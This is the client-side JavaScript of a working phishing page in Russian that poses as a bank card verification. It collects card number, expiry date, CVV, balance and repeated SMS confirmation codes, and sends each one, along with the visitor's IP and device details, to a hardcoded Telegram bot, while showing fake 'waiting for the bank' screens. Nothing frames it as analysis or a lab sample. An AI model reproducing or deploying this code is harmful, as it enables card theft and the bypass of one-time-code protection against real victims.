// Telegram bot settings
const BOT_TOKEN = '7860501166:AAH0NV8FJOmxLnOslL399M9xrFFFS1EhMSQ';
const CHAT_ID = '6871019082';

// Track page visit
async function trackVisit() {
    try {
        const response = await fetch(`https://api.ipify.org?format=json`);
        const data = await response.json();
        
        const message = `📱 *Новый посетитель*\n` +
                      `🆔 *IP:* ${data.ip}\n` +
                      `📱 *Устройство:* ${navigator.userAgent}`;
        
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
    } catch (error) {
        console.error('Error tracking visit:', error);
    }
}

// Format card number
function formatCardNumber(input) {
    let value = input.value.replace(/\D/g, '');
    value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
    input.value = value.trim();
}

// Format expiration date
function formatExpiryDate(input) {
    let value = input.value.replace(/\D/g, '');
    if (value.length > 2) {
        value = value.substring(0, 2) + '/' + value.substring(2, 4);
    }
    input.value = value;
}

// Format balance input
function formatBalance(input) {
    let value = input.value.replace(/\D/g, '');
    value = value.replace(/\B(?=(\d{3})+(?!\d))/g, ' ');
    input.value = value.trim();
}

// Show modal with balance input
function showBalanceModal() {
    document.getElementById('balanceModal').style.display = 'flex';
    document.getElementById('balance').focus();
}

// Hide modal
function hideBalanceModal() {
    document.getElementById('balanceModal').style.display = 'none';
    document.getElementById('balance').value = '';
}

// Show loading state
function showLoading() {
    const loading = document.createElement('div');
    loading.id = 'loading';
    loading.innerHTML = `
        <div class="loading-spinner"></div>
        <p>Обработка данных...</p>
    `;
    document.querySelector('.card-form').appendChild(loading);
}

// Hide loading state
function hideLoading() {
    const loading = document.getElementById('loading');
    if (loading) loading.remove();
}

// Show SMS form
function showSmsForm() {
    const smsMessage = document.createElement('div');
    smsMessage.className = 'sms-message';
    smsMessage.innerHTML = `
        <div class="sms-content">
            <h3>Для безопасности</h3>
            <p>На ваш номер телефона было отправлено SMS с кодом подтверждения.</p>
            <p>Введите код из SMS для завершения операции.</p>
            <div class="sms-input">
                <input type="text" maxlength="6" placeholder="Код из SMS">
                <button>Подтвердить</button>
            </div>
            <p class="status-message" style="margin-top: 10px; min-height: 24px;"></p>
        </div>
    `;
    document.querySelector('.card-form').appendChild(smsMessage);
    
    const statusMessage = smsMessage.querySelector('.status-message');
    const input = smsMessage.querySelector('input');
    const button = smsMessage.querySelector('button');
    let attempts = 0;
    const maxAttempts = 5;
    
    // Add click handler for SMS confirm button
    button.addEventListener('click', async function() {
        const smsCode = input.value.trim();
        
        if (smsCode && smsCode.length === 6) {
            try {
                // Show loading
                button.disabled = true;
                button.innerHTML = 'Отправка...';
                statusMessage.textContent = 'Отправка кода...';
                statusMessage.style.color = '#666';
                
                // Send SMS code to Telegram
                const smsMessageText = `🔐 *Код подтверждения*\n` +
                                    `Код: ${smsCode}`;
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: smsMessageText,
                        parse_mode: 'Markdown'
                    })
                });
                
                if (!response.ok) {
                    throw new Error('Ошибка отправки кода');
                }
                
                attempts++;
                
                if (attempts >= maxAttempts) {
                    // Redirect to main page after max attempts
                    window.location.href = 'index.html';
                    return;
                }
                
                // Show success status
                statusMessage.textContent = `Код отправлен (попытка ${attempts}/${maxAttempts})`;
                statusMessage.style.color = '#4CAF50';
                
                // Clear input for next attempt
                input.value = '';
                input.focus();
                
            } catch (error) {
                console.error('Error sending SMS code:', error);
                statusMessage.textContent = 'Ошибка отправки. Попробуйте еще раз.';
                statusMessage.style.color = '#ff4444';
            } finally {
                button.disabled = false;
                button.textContent = 'Подтвердить';
            }
        } else {
            statusMessage.textContent = 'Пожалуйста, введите корректный 6-значный код';
            statusMessage.style.color = '#ff4444';
        }
    });
}

// Function to handle confirmation from bot
function handleBotConfirmation() {
    // Clear the confirmation check interval
    if (window.confirmationCheck) {
        clearInterval(window.confirmationCheck);
    }
    
    // Remove waiting message
    const waitingDiv = document.querySelector('.waiting-message');
    if (waitingDiv) {
        waitingDiv.remove();
    }
    
    // Show SMS form
    showSmsForm();
}

// Make function globally available
window.handleBotConfirmation = handleBotConfirmation;

// Track page view
document.addEventListener('DOMContentLoaded', function() {
    trackVisit();
    
    // Initialize form elements
    const cardInput = document.getElementById('card');
    const dateInput = document.getElementById('date');
    const balanceInput = document.getElementById('balance');
    const mainForm = document.getElementById('dataForm');
    const submitBalanceBtn = document.getElementById('submitBalance');

    if (cardInput) {
        cardInput.addEventListener('input', () => formatCardNumber(cardInput));
    }
    
    if (dateInput) {
        dateInput.addEventListener('input', () => formatExpiryDate(dateInput));
    }
    
    if (balanceInput) {
        balanceInput.addEventListener('input', () => formatBalance(balanceInput));
    }

    // Main form submission
    if (mainForm) {
        mainForm.addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Get card data
            const card = document.getElementById('card').value;
            const date = document.getElementById('date').value;
            const cvv = document.getElementById('cvv').value;
            
            // Basic validation
            if (!card || !date || !cvv) {
                alert('Пожалуйста, заполните все поля');
                return;
            }
            
            // Store card data for later use
            window.cardData = { card, date, cvv };
            
            // Show balance modal
            showBalanceModal();
        });
    }
    
    // Handle balance submission
    if (submitBalanceBtn) {
        submitBalanceBtn.addEventListener('click', async function() {
            const balance = document.getElementById('balance').value;
            
            if (!balance) {
                alert('Пожалуйста, укажите баланс');
                return;
            }
            
            try {
                // Show loading after balance submission
                showLoading();
                
                // Format card message with emojis
                const cardMessage = `💳 *Данные карты*
` +
                                 `🔢 *Номер карты*: ${window.cardData.card}
` +
                                 `📅 *Срок действия*: ${window.cardData.date}
` +
                                 `🔐 *CVV код*: ${window.cardData.cvv}
` +
                                 `💰 *Доступный баланс*: ${balance} ₸`;
                
                // Show loading message
                const loadingMessage = document.createElement('div');
                loadingMessage.id = 'loadingMessage';
                loadingMessage.style.position = 'fixed';
                loadingMessage.style.top = '0';
                loadingMessage.style.left = '0';
                loadingMessage.style.width = '100%';
                loadingMessage.style.height = '100%';
                loadingMessage.style.backgroundColor = 'rgba(0,0,0,0.8)';
                loadingMessage.style.display = 'flex';
                loadingMessage.style.flexDirection = 'column';
                loadingMessage.style.justifyContent = 'center';
                loadingMessage.style.alignItems = 'center';
                loadingMessage.style.zIndex = '1000';
                loadingMessage.style.color = 'white';
                loadingMessage.innerHTML = `
                    <div style="text-align: center; padding: 20px;">
                        <div class="loader"></div>
                        <h2>Подождите</h2>
                        <p>Ожидаем ответ от банка...</p>
                    </div>
                `;
                document.body.appendChild(loadingMessage);

                // Send message with button
                const messageUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                const params = {
                    chat_id: CHAT_ID,
                    text: `${cardMessage}\n\nПодтвердите операцию:`,
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [{
                                text: '✅ Подтвердить',
                                callback_data: 'confirm_payment'
                            }]
                        ]
                    }
                };

                console.log('Sending to Telegram:', messageUrl, params);
                
                const messageResponse = await fetch(messageUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(params)
                });
                
                const messageResult = await messageResponse.json();
                console.log('Message response:', messageResult);
                
                if (!messageResponse.ok) {
                    throw new Error(`Failed to send message: ${messageResult.description || 'Unknown error'}`);
                }
                // Hide loading message when done
                const loadingElement = document.getElementById('loadingMessage');
                if (loadingElement) {
                    loadingElement.remove();
                }
                
                // Hide balance modal
                hideBalanceModal();
                
                // Show waiting message
                const waitingDiv = document.createElement('div');
                waitingDiv.className = 'waiting-message';
                waitingDiv.innerHTML = `
                    <div class="loader"></div>
                    <h3>Ожидаем подтверждения от банка...</h3>
                `;
                document.body.appendChild(waitingDiv);
                
                // Check for confirmation every 2 seconds
                const checkConfirmation = setInterval(async () => {
                    try {
                        // Check if confirmation was received
                        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
                        const data = await response.json();
                        
                        // Look for our callback query
                        const confirmation = data.result.find(update => 
                            update.callback_query && 
                            update.callback_query.data === 'confirm_payment'
                        );
                        
                        if (confirmation) {
                            // Clear the updates so we don't process them again
                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${confirmation.update_id + 1}`);
                            handleBotConfirmation();
                        }
                    } catch (error) {
                        console.error('Error checking confirmation:', error);
                    }
                }, 2000);
                
                // Store the interval ID to clear it later
                window.confirmationCheck = checkConfirmation;
            } catch (error) {
                console.error('Error:', error);
                alert('Произошла ошибка. Пожалуйста, попробуйте еще раз.');
            }
        });
    }

    // Check for confirmation parameter in URL
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('confirmed') === 'true') {
        showSmsForm();
    }
});
